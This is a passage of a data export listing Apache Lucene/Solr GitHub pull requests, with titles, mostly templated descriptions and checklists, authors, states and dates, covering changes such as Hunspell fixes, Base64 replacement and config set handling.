to see changes in these metrics quickly enough--and if the requests were sent too quickly we'd see local solr hosts OOMing. However, I was able to verify that the metrics are updating as the size of the queues change, and in a real environment with more sustained load we should see these metrics more accurately represent the state of the Overseer.  Testing confirmed that we don't see the Overseer metrics registry in non-cloud mode.  **/admin/metrics response containing added metrics**   **local testing sending CreateCollection request load and seeing metrics update in real time** ![image](https://user-images.githubusercontent.com/16807693/97367388-5d4a5d80-187f-11eb-8c45-58abb0b0e0cc.png)    # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","saatchibhalla","2020-10-27T22:47:04Z","2020-12-04T21:47:36Z"
"","1954","SOLR-14787 - Adding support to use inequalities to the payload check query parser.","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","kwatters","2020-10-06T20:40:24Z","2021-02-21T16:49:37Z"
"","2043","SOLR-14963: only count 1st level children in ChildDocTranformer limit","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","barrotsteindev","2020-10-28T23:54:17Z","2020-11-20T13:27:11Z"
"","2426","SOLR-15191: Fix faceting on EnumFieldType","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thomaswoeckinger","2021-02-24T12:30:10Z","2021-02-27T19:33:40Z"
"","1934","SOLR-14905: Update commons-io version to 2.8.0","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","NazerkeBS","2020-09-30T12:14:59Z","2020-10-01T08:08:22Z"
"","1753","Block collapse","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","joel-bernstein","2020-08-14T14:22:50Z","2020-08-16T02:14:39Z"
"","2391","SOLR-14341: Move configName into DocCollection class","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","NazerkeBS","2021-02-17T17:23:26Z","2021-03-15T13:20:53Z"
"","2230","SOLR-15011: /admin/logging handler is configured logs to all nodes","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","NazerkeBS","2021-01-21T19:00:09Z","2021-02-03T02:41:24Z"
"","2124","SOLR-8673: Open JSON Facet for extension","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","mkhludnev","2020-12-07T06:47:37Z","2020-12-07T08:39:31Z"
"","2116","SOLR-12182: Fix Changes.txt","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-12-03T00:23:44Z","2020-12-03T00:28:20Z"
"","1935","SOLR-14905: Update commons-io version to 2.8.0","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","NazerkeBS","2020-09-30T15:17:30Z","2020-10-01T09:31:18Z"
"","1884","LUCENE-9527: upgrade javacc to 7.0.4","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","dweiss","2020-09-17T10:35:02Z","2020-09-17T11:29:19Z"
"","1812","SOLR-14799: JWT authentication plugin only requires sub claim when pr…","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Only require sub claim when principalClaim=sub  # Solution  Removed setSubject() call, and adjusted tests accordingly.  # Tests  Adjusted tests to use the built-in ""customPrincipal"" claim, except for one test that uses principalClaim=sub.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `branch_8x` branch. - [x] I have run `ant precommit`. - [x] I have added tests for my changes. - [x] I have verified the documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only) is accurate.","closed","enhancement,","erikhatcher","2020-08-31T22:52:52Z","2020-11-10T22:44:51Z"
"","1759","SOLR-13438: on collection delete, also delete .AUTOCREATED config set","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  On collection delete, also delete its config set iff it has been auto-created and if there are no other references to it. https://issues.apache.org/jira/browse/SOLR-13438  # Solution  The following steps are followed on (the end of) DeleteCollectionCmd: * read config set name * if it is auto-created (suffixed with "".AUTOCREATED""), then:   * verify if any other collection uses the same config set   * if no other collection uses the same config set; then delete it  *Notes*: some comments were added referring to some other codes that do some similar things (like for finding out the configSetName of other collections). Maybe there's a better, reusable way of doing that - like triggering an extra command for deleting the config set, that my limited knowledge in the code has not figured out.  # Tests  Existing tests run successfully.   Added a new test: CollectionDeleteAlsoDeletesAutocreatedConfigSetTest. A collection is created (with it an auto-created config set is added. The collection is deleted, and it is verified that the "".AUTOCREATED"" config set has also been deleted.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. (an issue already existed) - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. (./gradlew check was executed, which seems to be applying the same checks) - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","adorow","2020-08-17T22:41:35Z","2020-08-25T06:08:46Z"
"","2219","LUCENE-9678: Hunspell: fix off-by-one error to support prefixes of word.length - 1","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  off-by-one error  # Solution  add 1 :)  # Tests  `IJ.aff` from Hunspell C++ (partial: without `IJ.wrong` assertions for now)  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-19T07:14:13Z","2021-01-19T12:38:48Z"
"","2329","LUCENE-9749: Hunspell: apply output conversion (OCONV) to the suggestions","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  OCONV should be applied not only to stems, but also suggestions  # Solution  Call the method that applies it :)  # Tests  `oconv` from Hunspell repo  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-09T08:14:48Z","2021-02-10T08:28:48Z"
"","2343","SOLR-15100: make ConfigSetService configurable in solr.xml","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  modify the static method ConfigSetService.createConfigSetService in that I can define the customized class name of ConfigSetService in solr.xml and create it in the method,  [https://issues.apache.org/jira/browse/SOLR-15100](https://issues.apache.org/jira/browse/SOLR-15100)  # Solution  modify the static method ConfigSetService.createConfigSetService , get property 'configSetService' which is name of customized ConfigSetService class name config in solr.xml and initialize it by java refect  # Tests  add a test case in TestCoreContainer, test method is testCustomConfigSetService()  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","baisui1981","2021-02-10T14:30:43Z","2021-03-02T03:27:38Z"
"","2388","LUCENE-9783: Hunspell: don't suggest more than 4 ngram corrections by default","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  MAXNGRAMSUGS has a default value of 4 (undocumented and not easy to find in source)  # Solution  Hardcode this 4  # Tests  `maxNGramSugsDefault` added  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-17T13:36:40Z","2021-02-18T09:15:14Z"
"","1744","SOLR-14731: Add SingleThreaded Annotation to Class","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Makes use of @anshumg  and @markrmiller's single threaded annotation so that it is more obvious to maintainers.  # Solution  adds it.   # Tests  Tests do not change for this one.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","MarcusSorealheis","2020-08-12T08:09:54Z","2020-08-24T19:07:58Z"
"","2080","LUCENE-8947: Skip field length accumulation when norms are disabled","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Lucene accumulates the total length when indexing the field. But when we use custom term frequencies to hold arbitrary scoring signals, Lucene will run into integer overflow error during accumulation if the scoring signals and the number of tokens are too large. This PR aims to fix this issue https://issues.apache.org/jira/browse/LUCENE-8947  # Solution  Skip the field length accumulation when norms is disabled.  # Tests  The test tries to index a field with extremely large custom term frequency  - Successfully index the field that omits norms - Expect to trigger the integer overflow error when indexing the same field with norms disabled  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","dxl360","2020-11-13T20:19:15Z","2020-12-15T15:43:20Z"
"","2389","LUCENE-9784: Hunspell suggestions: use US keyboard in absence of KEY …","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Like Hunspell/C++ does  # Solution  Set the default value accordingly  # Tests  `keyDefault` added (based on German dictionary)  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-17T13:54:16Z","2021-02-18T09:15:54Z"
"","2398","LUCENE-9785: Hunspell: don't check case in compound middle and end","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Like Hunspell does  # Solution  Check for the context before checking the case  # Tests  `keepcase` and `forbiddenword` expanded  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-18T09:30:53Z","2021-02-19T20:08:30Z"
"","2252","SOLR-15111: Use JDK8 Base64 instead of own implementation","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  JDK8 has a builtin Base64 encoder and decoder, there is no need to use own implementaion for this.  # Solution  Eliminate own implementation.  # Tests  Unit tests.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","asalamon74","2021-01-27T13:41:07Z","2021-02-04T11:49:43Z"
"","2222","SOLR-14297: replace commons-codec Base64 with JDK8 Base64","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Java8 has a builtin Base64 encoder and decoder, there is no need to use commons-codec for this purpose.  # Solution  Eliminate commons-codec Base64 usage  # Tests  Unit tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","asalamon74","2021-01-19T10:45:52Z","2021-01-21T18:10:34Z"
"","2026","LUCENE-8626: Standardize Lucene Test Files","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Janitor here, moving a closer to a standard test file naming convention, starting with Lucene.   # Solution  Janitorial work based on the work that @cpoerschke started a couple years ago in the ticket from the title.Almost every change was identical. More to come. PR was already growing too big.  # Tests  These are all tests.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","MarcusSorealheis","2020-10-25T07:37:10Z","2020-10-30T06:36:30Z"
"","2271","LUCENE-9709: Hunspell: no special dotted i treatment outside tr/az languages","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  İmply shouldn't be correct in English  # Solution  Check for language alternate casing when encountering dotted i  # Tests  `base_utf` from Hunspell repo  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-29T10:57:10Z","2021-02-01T09:34:47Z"
